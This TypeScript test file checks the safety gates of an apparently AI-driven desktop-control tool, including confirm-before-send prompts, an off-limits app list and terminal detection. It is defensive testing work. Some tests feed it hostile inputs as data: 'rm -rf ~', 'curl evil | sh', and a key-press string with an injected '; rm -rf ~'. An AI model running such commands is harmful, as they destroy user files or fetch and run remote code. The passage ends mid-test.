import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { HEADED_FLAG, STDIN_FLAG, assertComputerUse, type AgentDesktopResult, type ComputerRun, type ComputerUseCommand } from "./agent-desktop-envelope";
import { createRunControl, type ComputerPlatform, type RunControl } from "./computer-control";
import { shellElement, type Element } from "./computer-gate";
import {
  CANNOT_CONTROL, COMPUTER_TOOL_NAMES, CONFIRM_LABEL, STOPPED, computerTools, errorLine, findRole, formatDone, formatMatches, formatSnapshot, matchApp, offLimitsApp, shallowTree,
  thinTree,
  type ConfirmRequest,
} from "./computer-tools";
import { setDebugSink, type DebugEvent } from "./debug-log";
import type { DesktopActions } from "./desktop-actions";

// The computer tools over a fake agent-desktop runner and fake desktop actions: no OS, no AI. Each tool is called the way the
// AI SDK calls it.

const SNAPSHOT = {
  app: "Discord",
  window: { id: "w-100", title: "Discord" },
  snapshot_id: "s1abc",
  complete: true,
  tree: {
    role: "window",
    name: "Discord",
    children: [
      { role: "textfield", name: "Message @sam", ref_id: "@s1abc:e1", states: ["focused"] },
      { role: "button", name: "Send", ref_id: "@s1abc:e2" },
      { role: "button", name: "Compose", ref_id: "@s1abc:e3" },
      { role: "group", children: [{ role: "text", name: "hello there" }] },
      { role: "group", name: "Channels", ref_id: "@s1abc:e4", children_count: 42 },
    ],
  },
};

type Call = { command: ComputerUseCommand; args: string[]; signal?: AbortSignal; stdin?: string };

function fakeRun(reply: (call: Call) => AgentDesktopResult | Promise<AgentDesktopResult> = () => ({ ok: true, data: { disposition: { delivery: "delivered_verified" } } })) {
  const calls: Call[] = [];
  const run: ComputerRun = async (command, args, options) => {
    const call = { command, args, signal: options?.signal, ...(options?.stdin !== undefined ? { stdin: options.stdin } : {}) };
    calls.push(call);
    if (command === "snapshot") return { ok: true, data: SNAPSHOT };
    return reply(call);
  };
  return { run, calls };
}

const desktop: DesktopActions = {
  openApp: async (name) => ({ ok: true, message: `Opened ${name}` }),
  focusWindow: async ({ app }) => ({ ok: true, message: `Focused ${app}` }),
  openUrl: async (url) => ({ ok: true, message: `Opened ${url}` }),
};

function setup(
  options: { askFirst?: boolean; confirm?: (request: ConfirmRequest, signal: AbortSignal) => Promise<boolean>; run?: ComputerRun; control?: RunControl; platform?: ComputerPlatform } = {},
) {
  const fake = fakeRun();
  const run = options.run ?? fake.run;
  const control = options.control ?? createRunControl();
  const asked: ConfirmRequest[] = [];
  const steps: string[] = [];
  const tools = computerTools({
    run,
    desktop,
    control,
    platform: options.platform ?? "mac",
    askFirst: () => options.askFirst ?? true,
    confirm: async (request, signal) => {
      asked.push(request);
      return options.confirm ? options.confirm(request, signal) : true;
    },
    onStep: (label) => steps.push(label),
  });
  // The AI SDK's call shape.
  const call = <K extends keyof typeof tools>(name: K, input: Parameters<NonNullable<(typeof tools)[K]["execute"]>>[0]) =>
    (tools[name].execute as (input: unknown, options: unknown) => Promise<unknown>)(input, { toolCallId: `t-${String(name)}`, messages: [] });
  return { tools, call, calls: fake.calls, control, asked, steps };
}

beforeEach(() => {
  vi.spyOn(console, "debug").mockImplementation(() => undefined);
});
afterEach(() => vi.restoreAllMocks());

describe("formatSnapshot", () => {
  it("lists elements with refs, one line each, and remembers what each ref is", () => {
    const seen = new Map<string, Element>();
    const { text, app, focused } = formatSnapshot(SNAPSHOT, (ref, element) => seen.set(ref, element));
    expect(app).toBe("Discord");
    expect(text.split("\n")).toEqual([
      'App "Discord", window "Discord" (w-100)',
      'window "Discord"',
      '  textfield "Message @sam" @s1abc:e1 [focused]',
      '  button "Send" @s1abc:e2',
      '  button "Compose" @s1abc:e3',
      '  text "hello there"',
      '  group "Channels" @s1abc:e4 (42 inside: snapshot it with root)',
    ]);
    // Each ref keeps where it sits: the containers above it, its neighbours' labels and a text field beside it.
    expect(seen.get("@s1abc:e2")).toEqual({
      role: "button",
      name: "Send",
      context: { app: "Discord", ancestors: [{ role: "window", name: "Discord" }], nearby: ["Message @sam", "Compose", "Channels"], field: { role: "textfield", name: "Message @sam" } },
    });
    expect(focused).toMatchObject({ role: "textfield", name: "Message @sam" });
  });

  it("keeps the containers around each ref, and only short neighbour labels, never a text field's draft", () => {
    const seen = new Map<string, Element>();
    const data = {
      app: "Slack",
      window: { title: "general - Acme" },
      tree: {
        role: "window",
        name: "Slack",
        children: [
          {
            role: "group",
            name: "Composer",
            children: [
              { role: "textarea", name: "", value: "please search for the doc", ref_id: "@s2:e1" },
              { role: "toolbar", name: "Formatting", children: [{ role: "button", name: "Bold", ref_id: "@s2:e2" }, { role: "button", name: "", ref_id: "@s2:e3" }] },
            ],
          },
          {
            role: "list",
            name: "Messages in general",
            children: [
              { role: "listitem", name: "Sam: I will send the order confirmation to everyone tomorrow morning", ref_id: "@s2:e4" },
              { role: "listitem", name: "Kim: ok", ref_id: "@s2:e5" },
            ],
          },
        ],
      },
    };
    formatSnapshot(data, (ref, element) => seen.set(ref, element));
    // A text field's name never falls back to its draft (here it would read as a search box).
    expect(seen.get("@s2:e1")).toMatchObject({ role: "textarea", name: "", value: "please search for the doc" });
    expect(seen.get("@s2:e3")?.context).toEqual({
      app: "Slack general - Acme",
      ancestors: [{ role: "toolbar", name: "Formatting" }, { role: "group", name: "Composer" }, { role: "window", name: "Slack" }],
      nearby: ["Bold"],
      field: { role: "textarea", name: "" },
    });
    // A long message is content, not a label: it is not a neighbour.
    expect(seen.get("@s2:e5")?.context?.nearby).toEqual([]);
  });

  it("puts a root snapshot's region under the containers Bee kept for that ref", () => {
    const window = { role: "window", name: "Slack" };
    const within = { ref: "@s1:e7", element: { role: "group", name: "Composer", context: { app: "Slack", ancestors: [window], nearby: [], field: null } } };
    const seen = new Map<string, Element>();
    formatSnapshot({ tree: { role: "group", name: "Composer", ref_id: "@s1:e7", children: [{ role: "button", name: "", ref_id: "@s9:e1" }] } }, (ref, element) => seen.set(ref, element), undefined, within);
    expect(seen.get("@s9:e1")?.context).toMatchObject({ app: "Slack", ancestors: [{ role: "group", name: "Composer" }, window] });
    // A tree whose top is not the ref itself sits under it.
    formatSnapshot({ tree: { role: "group", name: "Inner", children: [{ role: "button", name: "", ref_id: "@s9:e2" }] } }, (ref, element) => seen.set(ref, element), undefined, within);
    expect(seen.get("@s9:e2")?.context?.ancestors).toEqual([{ role: "group", name: "Inner" }, { role: "group", name: "Composer" }, window]);
  });

  it("cuts a huge tree to fit", () => {
    const children = Array.from({ length: 3000 }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s1:e${index}` }));
    const { text } = formatSnapshot({ app: "Slack", tree: { role: "window", children } }, () => undefined, 2000);
    expect(text.length).toBeLessThan(2100);
    expect(text).toMatch(/more not shown/);
  });
});

describe("computerTools: what runs", () => {
  it("snapshots an app headless, then clicks a ref from it with fixed argv", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("snapshot", { app: "Discord" })).toContain('button "Send" @s1abc:e2');
    expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe("Done (delivered_verified).");
    expect(calls.map(({ command, args }) => [command, ...args])).toEqual([
      ["snapshot", "--interactive-only", "--compact", "--app=Discord", "--timeout-ms=12000"],
      ["click", "@s1abc:e3"],
    ]);
  });

  it("types and sets text on stdin with --stdin, never in argv or the log, and passes physical keys only when asked", async () => {
    const events: DebugEvent[] = [];
    setDebugSink({ write: (event) => events.push(event), wants: () => true });
    const { call, calls } = setup({ askFirst: false });
    try {
      await call("snapshot", { app: "Discord" });
      await call("type_text", { ref: "@s1abc:e1", text: "-5 is fine", effect: "none" });
      await call("type_text", { ref: "@s1abc:e1", text: "ok", effect: "none", physical: true });
      await call("set_value", { ref: "@s1abc:e1", value: "hunter2-secret", effect: "none" });
    } finally {
      setDebugSink(null);
    }
    expect(calls.slice(1).map(({ command, args, stdin }) => [command, args, stdin])).toEqual([
      ["type", ["@s1abc:e1", STDIN_FLAG], "-5 is fine"],
      ["type", ["@s1abc:e1", HEADED_FLAG, STDIN_FLAG], "ok"],
      ["set-value", ["@s1abc:e1", STDIN_FLAG], "hunter2-secret"],
    ]);
    for (const { command, args } of calls.slice(1)) {
      expect(args).not.toContain("--");
      expect(() => assertComputerUse(command, args)).not.toThrow();
    }
    const exec = events.filter((event) => event.event === "exec");
    expect(exec).toHaveLength(4);
    expect(JSON.stringify(exec)).not.toMatch(/hunter2|-5 is fine/);
  });

  it("waits on a ref's predicate with fixed argv, and refuses a bad mix before anything runs", async () => {
    const { call, calls } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("wait", { element: "@s1abc:e1", predicate: "value", value: "draft" })).toBe("Done.");
    expect(await call("wait", { element: "@s1abc:e1", predicate: "actionable", action: "type", timeout_ms: 3000 })).toBe("Done.");
    expect(await call("wait", { element: "@s1abc:e2" })).toBe("Done.");
    expect(await call("wait", { element: "@s1abc:e1", predicate: "value" })).toMatch(/^Error: give value/);
    expect(await call("wait", { element: "@s1abc:e1", predicate: "enabled", value: "x" })).toMatch(/^Error: value goes only/);
    expect(await call("wait", { element: "@s1abc:e1", predicate: "visible", action: "click" })).toMatch(/^Error: action goes only/);
    expect(await call("wait", { predicate: "value", value: "x" })).toMatch(/^Error: give element/);
    expect(await call("wait", { element: "@s9zzz:e1", predicate: "exists" })).toMatch(/^Error: use a ref/);
    const waits = calls.filter((item) => item.command === "wait").map(({ args }) => args);
    expect(waits).toEqual([
      ["--element=@s1abc:e1", "--predicate=value", "--value=draft", "--timeout=8000"],
      ["--element=@s1abc:e1", "--predicate=actionable", "--action=type", "--timeout=3000"],
      ["--element=@s1abc:e2", "--predicate=exists", "--timeout=8000"],
    ]);
    for (const args of waits) expect(() => assertComputerUse("wait", args)).not.toThrow();
  });

  it("reads a field's value and any other element's text by default", async () => {
    const { call, calls } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    await call("read", { ref: "@s1abc:e1" });
    await call("read", { ref: "@s1abc:e2" });
    expect(calls.slice(1).map(({ args }) => args)).toEqual([
      ["@s1abc:e1", "--property=value"],
      ["@s1abc:e2", "--property=text"],
    ]);
  });

  it("presses keys in a named app only, and closes apps but never Finder, Explorer or Bee", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("press_key", { keys: "Cmd + W", app: "Google Chrome", effect: "none" })).toMatch(/^Done/);
    expect(await call("press_key", { keys: "cmd+w; rm -rf ~", app: "Google Chrome", effect: "none" })).toMatch(/^Error/);
    expect(await call("close_app", { name: "Discord" })).toMatch(/^Done/);
    for (const name of ["Finder", "File Explorer", "Bee"]) expect(await call("close_app", { name })).toMatch(/^Error/);
    expect(calls.map(({ command, args }) => [command, ...args])).toEqual([
      ["press", "cmd+w", "--app=Google Chrome"],
      ["close-app", "Discord"],
    ]);
  });

  it("acts only on refs and window ids this task has seen", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("click", { ref: "@s1abc:e2", effect: "none" })).toMatch(/^Error: use a ref/);
    expect(await call("click", { ref: "@e2", effect: "none" })).toMatch(/^Error: use a ref/);
    expect(await call("snapshot", { app: "Discord", window_id: "w-999" })).toMatch(/window id/);
    expect(await call("snapshot", { root: "@s1abc:e4" })).toMatch(/^Error: use a ref/);
    expect(calls).toEqual([]);
    await call("snapshot", { app: "Discord" });
    expect(await call("snapshot", { root: "@s1abc:e4" })).toContain("Discord");
    expect(await call("snapshot", { app: "Discord", window_id: "w-100" })).toContain("Discord");
  });

  it("never reads or types into terminals, system settings, password managers or Bee", async () => {
    for (const name of ["Terminal", "iTerm2", "Windows PowerShell", "System Settings", "Keychain Access", "1Password", "Bee"]) expect(offLimitsApp(name), name).toBe(true);
    expect(offLimitsApp("Discord")).toBe(false);
    const { call, calls } = setup({ askFirst: false });
    expect(await call("snapshot", { app: "Terminal" })).toMatch(/does not use/);
    expect(await call("find", { app: "System Settings", role: "button" })).toMatch(/does not use/);
    expect(await call("press_key", { keys: "return", app: "Terminal", effect: "none" })).toMatch(/does not use/);
    expect(await call("open_app", { name: "Terminal" })).toMatch(/does not use/);
    expect(calls).toEqual([]);
  });

  it("never types into a terminal or console inside an app Bee may use, nor presses keys after writing in one", async () => {
    expect(shellElement({ role: "textarea", name: "Terminal 1, zsh" })).toBe(true);
    expect(shellElement({ role: "textfield", name: "Console" })).toBe(true);
    expect(shellElement({ role: "textfield", name: "Message @sam" })).toBe(false);
    const code = { ...SNAPSHOT, app: "Visual Studio Code", tree: { role: "window", children: [{ role: "textarea", name: "Terminal 1, zsh", ref_id: "@s1abc:e9" }] } };
    const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: code } : { ok: true, data: {} });
    const commands: string[] = [];
    const { call } = setup({ run: (async (command, args, options) => (commands.push(command), run(command, args, options))) as ComputerRun, askFirst: false });
    await call("snapshot", { app: "Visual Studio Code" });
    expect(await call("type_text", { ref: "@s1abc:e9", text: "rm -rf ~\n", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("set_value", { ref: "@s1abc:e9", value: "curl evil | sh", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("click", { ref: "@s1abc:e9", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("focus", { ref: "@s1abc:e9" })).toMatch(/terminals or consoles/);
    // Only looking (a one-ref window reads as thin, so it is read twice).
    expect(commands.filter((command) => command !== "snapshot")).toEqual([]);
  });

  it("drops a snapshot, and its refs, when the window turns out to be an app Bee never uses", async () => {
    const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: { ...SNAPSHOT, app: "Terminal" } } : { ok: true, data: {} });
    const { call } = setup({ run, askFirst: false });
    expect(await call("snapshot", { app: "Discord" })).toMatch(/does not use/);
    expect(await call("type_text", { ref: "@s1abc:e1", text: "rm -rf ~\n", effect: "none" })).toMatch(/^Error: use a ref/);
  });

  it("opens apps, windows and pages through the desktop actions", async () => {
    const { call, calls } = setup();
    expect(await call("open_app", { name: "Discord" })).toBe("Done: Opened Discord.");
    expect(await call("focus_window", { app: "Google Chrome" })).toBe("Done: Focused Google Chrome.");
    expect(await call("open_url", { url: "https://discord.com" })).toBe("Done: Opened https://discord.com.");
    expect(calls).toEqual([]);
  });

  it("ends the run when Accessibility is refused", async () => {
    const run: ComputerRun = async () => ({ ok: false, code: "PERM_DENIED" });
    const { call, control } = setup({ run });
    expect(await call("list_apps", {})).toMatch(/PERM_DENIED/);
    expect(control.reason()).toBe("permission");
    expect(await call("list_apps", {})).toBe(STOPPED);
  });

  it("shows each step as one short line", async () => {
    const { call, steps } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    await call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" });
    await call("press_key", { keys: "cmd+w", app: "Google Chrome", effect: "none" });
    expect(steps).toEqual(["Looking at Discord…", "Clicking Compose…", "Typing in Message @sam…", "Pressing Cmd+W…"]);
  });

  it("runs parallel calls one at a time, in order", async () => {
    const order: string[] = [];
    const run: ComputerRun = async (command, args) => {
      if (command === "snapshot") return { ok: true, data: SNAPSHOT };
      order.push(`start ${command}`);
      await new Promise((resolve) => setTimeout(resolve, command === "type" ? 20 : 0));
      order.push(`end ${command} ${args.at(-1)}`);
      return { ok: true, data: {} };
    };
    const { call } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    await Promise.all([call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" }), call("click", { ref: "@s1abc:e3", effect: "none" })]);
    expect(order).toEqual(["start type", `end type ${STDIN_FLAG}`, "start click", "end click @s1abc:e3"]);
  });
});

describe("computerTools: loop controls", () => {
  it("does nothing past the step limit", async () => {
    const { call, calls, control } = setup({ control: createRunControl({ maxSteps: 2 }) });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe(STOPPED);
    expect(calls).toHaveLength(2);
    expect(control.reason()).toBe("steps");
  });

  it("aborts the command in flight on stop", async () => {
    let started: () => void = () => undefined;
    const running = new Promise<void>((resolve) => (started = resolve));
    const run: ComputerRun = (_command, _args, options) =>
      new Promise((resolve) => {
        started();
        options?.signal?.addEventListener("abort", () => resolve({ ok: false, code: "ABORTED" }));
      });
    const { call, control } = setup({ run });
    const pending = call("list_apps", {});
    await running;
    control.stop("user");
    expect(await pending).toMatch(/ABORTED/);
    expect(await call("list_apps", {})).toBe(STOPPED);
  });
});

describe("computerTools: ask before sending or deleting", () => {
  it("waits for Confirm before a send, then sends", async () => {
    let answer: (confirmed: boolean) => void = () => undefined;
    const { call, calls, asked, steps } = setup({ confirm: () => new Promise((resolve) => (answer = resolve)) });
    await call("snapshot", { app: "Discord" });
    const click = call("click", { ref: "@s1abc:e2", effect: "none" });
    await vi.waitFor(() => expect(asked).toHaveLength(1));
    expect(asked[0]).toEqual({ kind: "send", question: "Send this?", detail: "Click “Send” in Discord" });
    expect(steps.at(-1)).toBe(CONFIRM_LABEL);
    expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
    answer(true);
    expect(await click).toMatch(/^Done/);
    expect(calls.map((item) => item.command)).toEqual(["snapshot", "click"]);
    expect(steps.at(-1)).toBe("Clicking Send…");
  });

  it("stops the task, and never sends, on Cancel", async () => {
    const { call, calls, control } = setup({ confirm: async () => false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s1abc:e2", effect: "none" })).toBe(STOPPED);
    expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
    expect([control.reason(), control.declined()]).toEqual(["declined", "send"]);
  });

  it("asks before Return in a message box and before an effect the AI declares, but not before drafting", async () => {
    const { call, asked } = setup();
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s1abc:e1", text: "Running late", effect: "none" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    expect(asked).toEqual([]);
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Message @sam”"]]);
    await call("click", { ref: "@s1abc:e3", effect: "delete" });
    expect(asked.map((request) => request.kind)).toEqual(["send", "delete"]);
  });

  it("runs on its own with the setting off", async () => {
    const { call, calls, asked } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s1abc:e2", effect: "send" })).toMatch(/^Done/);
    expect(asked).toEqual([]);
    expect(calls.map((item) => item.command)).toEqual(["snapshot", "click"]);
  });

  it("reads Stop while waiting as Cancel, and does not count the wait against the clock", async () => {
    vi.useFakeTimers();
    try {
      const control = createRunControl({ maxMs: 5000 });
      const { call, calls } = setup({ control, confirm: () => new Promise(() => undefined) });
      await call("snapshot", { app: "Discord" });
      const click = call("click", { ref: "@s1abc:e2", effect: "none" });
      await vi.advanceTimersByTimeAsync(30_000);
      expect(control.reason()).toBeNull();
      control.stop("user");
      expect(await click).toBe(STOPPED);
      expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
      expect(control.reason()).toBe("user");
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("computerTools: the confirm gate reads the tree, not the AI", () => {
  // Discord with an unlabelled arrow send button beside the message box, and a message's hover toolbar with a trash icon.
  const DISCORD = {
    app: "Discord",
    window: { id: "w-200", title: "@sam - Discord" },
    tree: {
      role: "window",
      name: "Discord",
      children: [
        { role: "tree", name: "Direct Messages", children: [{ role: "treeitem", name: "sam", ref_id: "@s3:e1" }] },
        { role: "textfield", name: "Search", ref_id: "@s3:e2" },
        {
          role: "list",
          name: "Messages in @sam",
          children: [
            {
              role: "listitem",
              name: "sam: hello there",
              children: [{ role: "toolbar", name: "Message actions", children: [{ role: "button", name: "Add Reaction", ref_id: "@s3:e3" }, { role: "button", name: "🗑", ref_id: "@s3:e4" }] }],
            },
          ],
        },
        {
          role: "group",
          name: "Message @sam",
          ref_id: "@s3:e5",
          children: [
            { role: "button", name: "Upload a file", ref_id: "@s3:e6" },
            { role: "textfield", name: "Message @sam", ref_id: "@s3:e7" },
            { role: "button", name: "Emoji", ref_id: "@s3:e8" },
            { role: "button", name: "", ref_id: "@s3:e9" },
          ],
        },
      ],
    },
  };
  const discordRun = (extra: (call: Call) => AgentDesktopResult | null = () => null) => {
    const commands: Call[] = [];
    const run: ComputerRun = async (command, args) => {
      commands.push({ command, args });
      return extra({ command, args }) ?? (command === "snapshot" ? { ok: true, data: DISCORD } : { ok: true, data: {} });
    };
    return { run, commands };
  };

  it("asks before clicking an unlabelled send arrow, though the AI said none", async () => {
    const { run, commands } = discordRun();
    const { call, asked } = setup({ run, confirm: async () => false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s3:e9", effect: "none" })).toBe(STOPPED);
    expect(asked).toEqual([{ kind: "send", question: "Send this?", detail: "Click the selected item in Discord" }]);
    expect(commands.map((item) => item.command)).toEqual(["snapshot"]);
  });

  it("asks before a trash icon, but not before navigating, drafting or opening the emoji picker", async () => {
    const { run } = discordRun();
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s3:e1", effect: "none" });
    await call("click", { ref: "@s3:e7", effect: "none" });
    await call("set_value", { ref: "@s3:e7", value: "Running late", effect: "none" });
    await call("click", { ref: "@s3:e8", effect: "none" });
    expect(asked).toEqual([]);
    await call("click", { ref: "@s3:e4", effect: "none" });
    await call("click", { ref: "@s3:e6", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["delete", "send"]);
  });

  it("does not ask before Return once focus has left a search box for somewhere unknown", async () => {
    const { run } = discordRun();
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s3:e2", text: "sam", effect: "none" });
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked).toEqual([]);
    // The search jumped somewhere: focus is unknown, and nothing says Return there commits.
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked).toEqual([]);
    // Clicking into the message box puts focus there; Return sends.
    await call("click", { ref: "@s3:e7", effect: "none" });
    await call("press_key", { keys: "ctrl+enter", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Ctrl+Enter in “Message @sam”"]]);
  });

  it("asks before Return when a snapshot shows the message box focused, with nothing typed this run", async () => {
    const focused = { ...SNAPSHOT, tree: { role: "window", children: [{ role: "textarea", name: "Message #job-search", ref_id: "@s4:e1", states: ["focused"] }] } };
    const { call, asked } = setup({ run: async (command) => (command === "snapshot" ? { ok: true, data: focused } : { ok: true, data: {} }) });
    await call("snapshot", { app: "Discord" });
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Message #job-search”"]]);
  });

  it("keeps the containers above a root snapshot's region, and does not ask before an unlabelled match from find", async () => {
    // The region alone says nothing (no app, no names): only what Bee kept about @s3:e5 shows it is Discord's message box.
    const region = { tree: { role: "group", name: "", ref_id: "@s3:e5", children: [{ role: "button", name: "", ref_id: "@s5:e1" }] } };
    const { run } = discordRun(({ command, args }) => {
      if (command === "snapshot" && args.includes("--root=@s3:e5")) return { ok: true, data: region };
      if (command === "find") return { ok: true, data: { matches: [{ role: "button", name: "", ref_id: "@s6:e1" }, { role: "button", name: "Gift", ref_id: "@s6:e2" }] } };
      return null;
    });
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("snapshot", { root: "@s3:e5" });
    await call("click", { ref: "@s5:e1", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["send"]);
    await call("find", { app: "Discord", role: "button" });
    await call("click", { ref: "@s6:e2", effect: "none" });
    expect(asked).toHaveLength(1);
    await call("click", { ref: "@s6:e1", effect: "none" });
    expect(asked).toHaveLength(1);
  });

  it("still runs on its own with the setting off", async () => {
    const { run, commands } = discordRun();
    const { call, asked } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s3:e9", effect: "none" })).toMatch(/^Done/);
    expect(await call("click", { ref: "@s3:e4", effect: "none" })).toMatch(/^Done/);
    expect(asked).toEqual([]);
    expect(commands.map((item) => item.command)).toEqual(["snapshot", "click", "click"]);
  });
});

describe("formatSnapshot and formatMatches: odd nodes", () => {
  it("survives hostile, partial and very deep nodes, and says what it left out", () => {
    const hostile = Object.defineProperty({ role: "button", ref_id: "@s1:e9" }, "name", {
      enumerable: true,
      get() {
        throw new Error("boom");
      },
    });
    const trap = new Proxy(
      {},
      {
        get() {
          throw new Error("trap");
        },
      },
    );
    let deep: Record<string, unknown> = { role: "button", name: "Deep", ref_id: "@s1:e99" };
    for (let index = 0; index < 5000; index += 1) deep = { role: "group", name: `g${index}`, children: [deep] };
    const data = {
      app: "Microsoft Teams",
      complete: false,
      tree: {
        role: "window",
        children: [
          { role: "button", name: "Send", ref_id: "@s1:e1" },
          hostile,
          trap,
          { role: 42, name: { x: 1 }, value: ["v"], states: "focused", children: "nope", children_count: "12", ref_id: 7 },
          { role: "textfield", name: "Type a message", ref_id: "@s1:e2", states: [null, 3, "focused"] },
          null,
          5,
          "text",
          deep,
        ],
      },
    };
    const seen = new Map<string, Element>();
    const { text, focused } = formatSnapshot(data, (ref, element) => seen.set(ref, element));
    expect(text).toContain('button "Send" @s1:e1');
    expect(text).toContain('textfield "Type a message" @s1:e2 [focused]');
    expect(text).toContain(", partial: raise detail with root");
    expect(text).toMatch(/2 elements could not be read and are left out/);
    expect(text).toMatch(/deeper elements not shown/);
    expect(focused).toMatchObject({ role: "textfield", name: "Type a message" });
    expect([...seen.keys()]).toEqual(expect.arrayContaining(["@s1:e1", "@s1:e2"]));
    expect(seen.has("@s1:e9")).toBe(false);
    // Not a tree at all.
    expect(formatSnapshot("nope", () => undefined).text).toBe("Empty snapshot.");
    expect(formatSnapshot({ tree: trap }, () => undefined).text).toMatch(/1 element could not be read/);
  });

  it("keeps the matches it can read", () => {
    const hostile = Object.defineProperty({ role: "button" }, "name", {
      enumerable: true,
      get() {
        throw new Error("boom");
      },
    });
    expect(formatMatches({ matches: [hostile, { role: "button", name: "Send", ref_id: "@s2:e1" }] }, () => undefined)).toBe('button "Send" @s2:e1');
    expect(formatMatches({ matches: [hostile] }, () => undefined)).toBe("No matches Bee could read.");
  });
});

describe("errorLine: what the AI is told", () => {
  it("names the code, says what to do, and passes on agent-desktop's redacted message", () => {
    const line = errorLine({ ok: false, code: "INTERNAL", message: "Accessibility deadline exhausted before IPC", retry: "safe" }, true);
    expect(line).toMatch(/^Error INTERNAL: /);
    expect(line).toMatch(/skeleton snapshot, then root/);
    expect(line).toMatch(/If it keeps failing, stop and say Bee cannot control this app\./);
    expect(line).toMatch(/Detail: Accessibility deadline exhausted before IPC$/);
    expect(line).not.toMatch(/that did not work/);
  });

  it("tells a slow read from an action that may have happened", () => {
    expect(errorLine({ ok: false, code: "TIMEOUT" }, true)).toMatch(/did not finish in time/);
    expect(errorLine({ ok: false, code: "TIMEOUT" })).toMatch(/may still have happened/);
    expect(errorLine({ ok: false, code: "INTERNAL", retry: "unsafe" })).toMatch(/It may still have happened: look before trying again\./);
    expect(errorLine({ ok: false, code: "INTERNAL", retry: "safe" })).not.toMatch(/may still have happened/);
    expect(errorLine("STALE_REF")).toBe("Error STALE_REF: the screen changed. Take a new snapshot and use its refs.");
    expect(errorLine({ ok: false, code: "SOMETHING_NEW", message: "odd" })).toBe("Error SOMETHING_NEW: that did not work. Look again before trying something else. Detail: odd");
    for (const code of ["INTERNAL", "BAD_OUTPUT", "SPAWN_FAILED", "REFUSED", "TIMEOUT_LOCAL", "APP_UNRESPONSIVE"]) expect(errorLine(code, true), code).not.toMatch(/that did not work/);
  });
});

describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such as Teams)", () => {
  type Timed = { command: ComputerUseCommand; args: string[]; timeoutMs?: number };
  const INTERNAL: AgentDesktopResult = { ok: false, code: "INTERNAL", message: "Accessibility deadline exhausted before IPC", retry: "safe" };
  const tree = (refs: number, extra: Record<string, unknown> = {}) => ({
    app: "Microsoft Teams",
    window: { id: "w-7", title: "Chat | Microsoft Teams" },
    ...extra,
    tree: { role: "window", children: Array.from({ length: refs }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s7:e${index}` })) },
  });
  const timedRun = (reply: (call: Timed, index: number) => AgentDesktopResult) => {
    const calls: Timed[] = [];
    const run: ComputerRun = async (command, args, options) => {
      const call = { command, args, timeoutMs: options?.timeoutMs };
      calls.push(call);
      return reply(call, calls.length - 1);
    };
    return { run, calls };
  };

  it("reads again once, in a new process with more time and depth, when a read fails where a retry is safe", async () => {
    const { run, calls } = timedRun(() => INTERNAL);
    const { call, steps } = setup({ run, askFirst: false });
    const line = await call("snapshot", { app: "Microsoft Teams" });
    expect(line).toMatch(/^Error INTERNAL: .*Detail: Accessibility deadline exhausted before IPC$/);
    expect(calls.map(({ args, timeoutMs }) => [args.slice(2).join(" "), timeoutMs])).toEqual([
      ["--app=Microsoft Teams --timeout-ms=12000", 18_000],
      ["--app=Microsoft Teams --max-depth=25 --timeout-ms=25000", 31_000],
    ]);
    expect(steps).toEqual(["Looking at Microsoft Teams…", "Waiting for the app…"]);
  });

  it("returns the second read when it works", async () => {
    const { run, calls } = timedRun((_call, index) => (index === 0 ? INTERNAL : { ok: true, data: tree(6) }));
    const { call } = setup({ run, askFirst: false });
    expect(await call("snapshot", { app: "Microsoft Teams", skeleton: true })).toContain('button "Item 5" @s7:e5');
    // A skeleton is shallow by design: the second read is longer, not deeper.
    expect(calls.map(({ args }) => args.at(-2))).toEqual(["--skeleton", "--skeleton"]);
  });

  it("does not read again when agent-desktop does not call a retry safe, or for an error a retry cannot fix", async () => {
